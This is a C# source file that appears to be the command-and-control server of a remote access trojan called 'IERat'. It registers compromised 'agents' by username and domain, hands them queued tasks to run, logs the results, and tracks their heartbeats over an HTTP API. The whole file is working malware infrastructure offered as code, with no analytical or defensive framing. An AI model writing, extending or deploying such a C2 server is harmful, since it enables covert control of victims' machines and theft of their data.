using IERat;
using System;
using System.Threading.Tasks;
using WatsonWebserver;
using IERatServer.lib;
using IERat.lib;

namespace IERatServer
{
    class API
    {
        public static void Start(string IP, int Port)
        {
            // change on true for ssl , should work on linux
            // for windows use - https://github.com/jchristn/WatsonWebserver/wiki/Using-SSL-on-Windows
            Server s = new(IP, Port, false, DefaultRoute);
            try { s.Start(); }
            catch (Exception ex) { Console.WriteLine(ex.GetBaseException().Message); }
        }

        [StaticRoute(HttpMethod.POST, "/api/v1/fetch")]
        public static async Task FetchCommandRoute(HttpContext ctx)
        {
            ctx.Response.StatusCode = 200;
            // get request object
            RequestObject requestObject = ctx.Request.DataAsJsonObject<RequestObject>();
            // print command results and save to history
            foreach (TaskObject taskObject in requestObject.CompletedTasks)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n{taskObject.Type} {taskObject.args} --> {taskObject.Result}\n");
                Console.ForegroundColor = ConsoleColor.White;
                Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestObject.AgentID, task = taskObject });
            }

            Db.GetChannelFromID(requestObject.AgentID).UpdateHeartBeatTime();         

            ResponseObject responseObject = new()
            {
                Type = "NewTask",
                Task = GetTaskFromAgent(requestObject.AgentID),
                Notes = "",
            };
            await ctx.Response.Send(ServerUtils.GenerateResponse(responseObject.ToJSON()));
        }

        [StaticRoute(HttpMethod.POST, "/api/v1/auth")]
        public static async Task AuthRoute(HttpContext ctx)
        {
            ctx.Response.StatusCode = 200;
            Agent beacon = ctx.Request.DataAsJsonObject<Agent>();
            ResponseObject responseObject = new()
            {
                Type = "NewAgent",
                Task = null,
                Notes = "Ok",
            };
            if (!Db.AgentExists(beacon.ID)) 
            {
                responseObject.Notes = "Authenticated";
                Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine($"\n---> New agent connection {beacon.Username}@{beacon.Domain}\n");
                Console.ForegroundColor = ConsoleColor.White;
            }

            await ctx.Response.Send(ServerUtils.GenerateResponse(responseObject.ToJSON()));
        }
        static async Task DefaultRoute(HttpContext ctx)
        {
            await ctx.Response.Send("Hello World");
        }
        public static TaskObject GetTaskFromAgent(Guid ID)
        {
            AgentChannel Channel = Db.channels.Find(Channel => Channel.agent.ID == ID);
            if (Channel != null) {
                var TaskToRun = Channel.agent.AgentTasks.Dequeue();
                TaskToRun.Status = "In Progress";
                return TaskToRun;
            }
            else {
                TaskObject ResetConnectionTask = new TaskObject { Type = "Reset" };
                return ResetConnectionTask;
            }            
        }
    }
}
